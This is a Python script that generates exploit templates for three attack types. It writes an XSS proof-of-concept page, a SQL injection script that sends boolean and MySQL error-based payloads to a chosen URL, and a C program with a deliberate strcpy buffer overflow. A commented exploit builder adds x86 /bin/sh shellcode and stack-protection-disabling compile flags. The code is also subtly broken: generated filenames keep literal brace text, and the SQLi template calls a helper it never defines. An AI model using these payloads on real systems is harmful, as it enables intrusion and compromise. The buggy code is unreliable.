#!/usr/bin/env python3

import argparse
import os
import sys
from datetime import datetime

# --- Configuration ---
OUTPUT_DIR = "exploit_templates"

# --- Helper Functions ---
def print_colored(text, color):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "magenta": "\033[95m",
        "cyan": "\033[96m",
        "white": "\033[97m",
        "reset": "\033[0m"
    }
    print(f"{colors.get(color, colors['reset'])}{text}{colors['reset']}")

def generate_xss_template(target_url, payload):
    """Generates a basic HTML/JavaScript template for XSS testing."""
    if not payload:
        payload = "<script>alert('XSS');</script>"

    template = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Proof of Concept</title>
    <style>
        body {{ font-family: sans-serif; margin: 20px; background-color: #f4f4f4; color: #333; }}
        .container {{ background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }}
        h1 {{ color: #d9534f; }}
        pre {{ background-color: #eee; padding: 15px; border-radius: 5px; overflow-x: auto; }}
        code {{ color: #c7254e; background-color: #f9f2f4; padding: 2px 4px; border-radius: 4px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>XSS Proof of Concept</h1>
        <p>This page demonstrates a potential Cross-Site Scripting (XSS) vulnerability at:</p>
        <p><code>{target_url}</code></p>
        <p>The following payload was used:</p>
        <pre><code>{payload.replace('<', '&lt;').replace('>', '&gt;')}</code></pre>
        <p>To test, inject the payload into the vulnerable parameter of the target URL.</p>

        <h2>Example Injection (Conceptual)</h2>
        <p>If the vulnerable parameter is <code>q</code> in <code>{target_url}?q=</code>, try navigating to:</p>
        <pre><code>{target_url}?q={payload.replace('<', '%3C').replace('>', '%3E').replace(' ', '%20')}</code></pre>

        <h2>Payload Execution (if reflected)</h2>
        <p>If the payload is reflected and executed, you might see an alert box or other unexpected behavior.</p>

        <!-- The actual payload might be injected here by the vulnerable application -->
        <!-- For demonstration, we'll just show the payload -->
    </div>
</body>
</html>
"""
    return template

def generate_sqli_template(target_url, parameter, db_type="MySQL", technique="Error-Based"):
    """Generates a basic Python script template for SQL Injection testing."""
    if not parameter:
        parameter = "id"

    template = f"""#!/usr/bin/env python3

import requests

# SQL Injection Proof of Concept Script
# Target: {target_url}
# Vulnerable Parameter: {parameter}
# Database Type (Assumed): {db_type}
# Technique (Assumed): {technique}

def test_sqli(base_url, param_name):
    print(f"[*] Testing SQL Injection on {{base_url}} with parameter '{{param_name}}'")

    # --- Basic Test: Check for boolean-based SQLi ---
    # Original request
    print("[+] Sending original request...")
    resp_original = requests.get(f"{{base_url}}?{{param_name}}=1")
    print(f"    Status: {{resp_original.status_code}}, Length: {{len(resp_original.text)}}")

    # True condition
    print("[+] Sending TRUE condition payload (1 AND 1=1)...")
    payload_true = f"1 AND 1=1"
    resp_true = requests.get(f"{{base_url}}?{{param_name}}={{payload_true}}")
    print(f"    Status: {{resp_true.status_code}}, Length: {{len(resp_true.text)}}")

    # False condition
    print("[+] Sending FALSE condition payload (1 AND 1=2)...")
    payload_false = f"1 AND 1=2"
    resp_false = requests.get(f"{{base_url}}?{{param_name}}={{payload_false}}")
    print(f"    Status: {{resp_false.status_code}}, Length: {{len(resp_false.text)}}")

    if len(resp_true.text) != len(resp_false.text):
        print_colored("[!!!] Potential Boolean-based SQL Injection detected!", "red")
    else:
        print_colored("[---] Boolean-based SQL Injection not directly confirmed by length difference.", "yellow")

    # --- Error-Based SQLi (Example for MySQL) ---
    if "mysql" in db_type.lower():
        print("\n[*] Testing for Error-Based SQL Injection (MySQL specific)...")
        error_payload = f"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)"
        print(f"[+] Sending error-based payload: {{error_payload}}")
        resp_error = requests.get(f"{{base_url}}?{{param_name}}={{error_payload}}")
        if "syntax error" in resp_error.text.lower() or "duplicate entry" in resp_error.text.lower():
            print_colored("[!!!] Potential Error-Based SQL Injection detected! Check response for database errors.", "red")
            print(f"    Response snippet: {{resp_error.text[resp_error.text.find('error')-50:resp_error.text.find('error')+100]}}...")
        else:
            print_colored("[---] Error-Based SQL Injection not detected with this payload.", "yellow")

    print("\n[*] Manual verification is highly recommended.")
    print("    Consider using sqlmap for automated detection and exploitation.")

if __name__ == "__main__":
    # Example Usage:
    # python3 sqli_poc.py "http://example.com/products" "id"
    # python3 sqli_poc.py "http://localhost/vulnerable_app/view.php" "user_id" "PostgreSQL"

    # This script is a template. Replace with actual target and parameter.
    # For a real test, you would integrate this into a larger testing framework.
    print_colored("This is a template script. Modify target_url and param_name as needed.", "yellow")
    # test_sqli("http://example.com/vulnerable", "id")
"""
    return template

def generate_buffer_overflow_template(language="C", arch="x86", os_type="Linux"):
    """Generates a basic C template for buffer overflow testing."""
    if language.lower() != "c":
        return "Unsupported language for buffer overflow template. Only C is supported currently."

    template = f"""/*
 * Basic Buffer Overflow Proof of Concept (C Language)
 * Target Architecture: {arch}
 * Target OS: {os_type}
 *
 * WARNING: This code is for educational purposes ONLY. Do not use on systems
 *          without explicit authorization. Misuse can lead to system instability
 *          or security breaches.
 *
 * Compile with: gcc -fno-stack-protector -z execstack -o vulnerable_program vulnerable_program.c
 * (Disable stack protector and enable executable stack for easier exploitation in labs)
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// --- Vulnerable Program (Example) ---
void vulnerable_function(char *input)
{{
    char buffer[64]; // A buffer of 64 bytes
    strcpy(buffer, input); // No bounds checking, vulnerable to buffer overflow
    printf("Received: %s\n", buffer);
}}

int main(int argc, char **argv)
{{
    if (argc < 2)
    {{
        printf("Usage: %s <input_string>\n", argv[0]);
        exit(0);
    }}
    printf("[*] Calling vulnerable_function with input: %s\n", argv[1]);
    vulnerable_function(argv[1]);
    printf("[*] Program finished.\n");
    return 0;
}}

// --- Exploit Template (Conceptual - Python) ---
// This Python script would typically be run separately to generate the malicious input.
/*
import sys

# Offset to overwrite EIP/RIP (needs to be determined via debugging, e.g., with GDB/Immunity Debugger)
# For a 64-byte buffer, plus EBP/RBP, offset might be around 76 bytes for 32-bit, more for 64-bit.
# This is highly dependent on compiler, OS, and architecture.
OFFSET = 76 # Example offset, needs to be found dynamically

# NOP sled (No Operation instructions) - for reliability
# \x90 is the NOP instruction for x86/x64
NOP_SLED = b"\x90" * 20

# Shellcode (e.g., execve(\"/bin/sh\", NULL, NULL) for Linux x86)
# Example Linux x86 shellcode for /bin/sh (from exploit-db.com)
# This is just an example, actual shellcode depends on target OS/arch.
SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Return Address (Address of NOP sled or shellcode in memory)
# This address needs to be found dynamically during debugging.
# Example: b"\xde\xc0\xad\xde" (0xdeadc0de - little endian)
RETURN_ADDRESS = b"\x44\x33\x22\x11" # Placeholder

# Construct the malicious input
# Fill buffer with A's, then NOP sled, then shellcode, then return address
# The exact order and padding might vary.
exploit_string = b"A" * (OFFSET - len(NOP_SLED) - len(SHELLCODE)) + NOP_SLED + SHELLCODE + RETURN_ADDRESS

sys.stdout.buffer.write(exploit_string)

# To run:
# (python3 exploit_generator.py > input.txt) && ./vulnerable_program $(cat input.txt)
# Or directly:
# python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\x44\x33\x22\x11")' | ./vulnerable_program
*/
"""
    return template

# --- Main Logic ---
def main():
    parser = argparse.ArgumentParser(
        description="Generates boilerplate code templates for common exploit types.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("exploit_type", choices=["xss", "sqli", "buffer-overflow"],
                        help="Type of exploit template to generate.")
    parser.add_argument("--target-url", help="Target URL for XSS/SQLi exploits (e.g., http://example.com/vulnerable). Required for XSS/SQLi.")
    parser.add_argument("--payload", help="Custom payload for XSS. Default will be used if not provided.")
    parser.add_argument("--parameter", help="Vulnerable parameter for SQLi (e.g., 'id'). Default is 'id'.")
    parser.add_argument("--db-type", default="MySQL", help="Assumed database type for SQLi (e.g., MySQL, PostgreSQL). Default is MySQL.")
    parser.add_argument("--technique", default="Error-Based", help="Assumed SQLi technique (e.g., Error-Based, Union-Based). Default is Error-Based.")
    parser.add_argument("--language", default="C", choices=["C"], help="Language for buffer overflow template. Default is C.")
    parser.add_argument("--arch", default="x86", choices=["x86", "x64"], help="Architecture for buffer overflow template. Default is x86.")
    parser.add_argument("--os-type", default="Linux", choices=["Linux", "Windows"], help="OS type for buffer overflow template. Default is Linux.")
    parser.add_argument("--output", "-o", action="store_true", help="Save the generated template to a file.")
    parser.add_argument("--dry-run", action="store_true", help="Print the generated template to stdout without saving to a file.")

    args = parser.parse_args()

    generated_code = ""
    output_filename = ""

    if args.exploit_type == "xss":
        if not args.target_url:
            print_colored("[-] Error: --target-url is required for XSS exploit type.", "red")
            sys.exit(1)
        generated_code = generate_xss_template(args.target_url, args.payload)
        output_filename = f"xss_poc_{{datetime.now().strftime('%Y%m%d%H%M%S')}}.html"
    elif args.exploit_type == "sqli":
        if not args.target_url:
            print_colored("[-] Error: --target-url is required for SQLi exploit type.", "red")
            sys.exit(1)
        generated_code = generate_sqli_template(args.target_url, args.parameter, args.db_type, args.technique)
        output_filename = f"sqli_poc_{{datetime.now().strftime('%Y%m%d%H%M%S')}}.py"
    elif args.exploit_type == "buffer-overflow":
        generated_code = generate_buffer_overflow_template(args.language, args.arch, args.os_type)
        output_filename = f"buffer_overflow_poc_{{datetime.now().strftime('%Y%m%d%H%M%S')}}.c"

    if args.dry_run:
        print_colored("\n--- DRY RUN GENERATED CODE ---", "yellow")
        print(generated_code)
        print_colored("\n--- END DRY RUN ---", "yellow")
    elif args.output:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        output_path = os.path.join(OUTPUT_DIR, output_filename)
        with open(output_path, 'w') as f:
            f.write(generated_code)
        print_colored(f"[+] Exploit template successfully generated and saved to: {output_path}", "green")
    else:
        print_colored("\n--- GENERATED CODE (not saved) ---", "yellow")
        print(generated_code)
        print_colored("\n--- END GENERATED CODE ---", "yellow")

    print_colored("\n[+] Exploit template generation complete!", "green")

if __name__ == "__main__":
    main()
